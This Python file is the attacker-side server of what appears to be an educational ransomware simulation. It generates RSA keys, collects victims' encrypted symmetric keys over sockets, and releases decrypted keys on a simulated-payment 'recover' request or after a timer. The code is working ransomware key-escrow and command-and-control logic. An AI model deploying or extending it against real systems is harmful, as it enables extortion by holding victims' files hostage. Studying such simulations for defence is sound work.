import socket, threading, json, base64, os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class servidorAtacante:
    def __init__(self, host='localhost', port=9999, auto_release=True, release_delay=5):
        self.host = host
        self.port = port
        self.private_key = None
        self.public_key = None
        self.claves_guardadas = {}
        self.claves_disponibles = {}
        self.auto_release = auto_release
        self.release_delay = release_delay

    def generar_par_claves(self):
        print("Atacante: Generando par de claves RSA...")
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        print("Par de claves RSA generado")

    def serializar_public_key(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    def recibir_clave_cifrada(self, datos_victima):
        try:
            datos = json.loads(datos_victima)
            victim_id = datos['victim_id']
            clave_cifrada = base64.b64decode(datos['clave_cifrada'])
            self.claves_guardadas[victim_id] = clave_cifrada
            print(f"Atacante: Clave cifrada recibida y guardada para victima {victim_id}")

            
            if self.auto_release:
                try:
                    import threading
                    print(f"Atacante: Liberación automática activada, la clave se liberará en {self.release_delay}s para {victim_id}")
                    t = threading.Timer(self.release_delay, self.proceso_recuperacion, args=(victim_id,))
                    t.daemon = True
                    t.start()
                except Exception as e:
                    print(f"Atacante: Error al programar liberación automática: {e}")
            return True
        except Exception as e:
            print(f"Error recibiendo clave: {e}")
            return False

    def descifrar_clave_simetrica(self, clave_cifrada):
        try:
            clave_simetrica = self.private_key.decrypt(
                clave_cifrada,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            print("Atacante: Clave simetrica descifrada exitosamente")
            return clave_simetrica
        except Exception as e:
            print(f"Error descifrando clave: {e}")
            return None

    def manejar_victima(self, conn, addr):
        print(f"Atacante: Conexion establecida con {addr}")
        try:
            public_key_pem = self.serializar_public_key()
            conn.send(public_key_pem)
            print("Atacante: Clave publica enviada a la victima")

            datos_victima = conn.recv(4096).decode('utf-8')
            try:
                datos = json.loads(datos_victima)
            except Exception as e:
                print(f"Atacante: Error parseando JSON recibido: {e}")
                conn.send(b"ERROR: JSON invalido")
                return

            # Recuperacion (simulacion de pago)
            if datos.get('action') == 'recover' and 'victim_id' in datos:
                victim_id = datos['victim_id']
                resultado = self.proceso_recuperacion(victim_id)
                if resultado:
                    resp = json.dumps({'status': 'OK', 'clave_simetrica': resultado}).encode('utf-8')
                    conn.send(resp)
                    print(f"Atacante: Enviada clave simetrica (base64) para victima {victim_id}")
                else:
                    resp = json.dumps({'status': 'ERROR', 'message': 'Clave no encontrada o error'}).encode('utf-8')
                    conn.send(resp)

            elif 'victim_id' in datos and 'clave_cifrada' in datos:
                if self.recibir_clave_cifrada(json.dumps(datos)):
                    conn.send(b"OK: Clave recibida correctamente")
                else:
                    conn.send(b"ERROR: Problema con la clave")
            else:
                conn.send(b"ERROR: Mensaje no reconocido")

        except Exception as e:
            print(f"Error en comunicacion con victima: {e}")
        finally:
            conn.close()

    def iniciar_servidor(self):
        self.generar_par_claves()
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(1)
        print(f"Servidor Atacante escuchando en {self.host}:{self.port}")
        print("Esperando conexiones de victimas...")

        try:
            while True:
                conn, addr = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.manejar_victima,
                    args=(conn, addr)
                )
                client_thread.start()
        except KeyboardInterrupt:
            print("\nServidor detenido manualmente")
        finally:
            server_socket.close()

if __name__ == "__main__":
    servidor = servidorAtacante()
    servidor.iniciar_servidor()
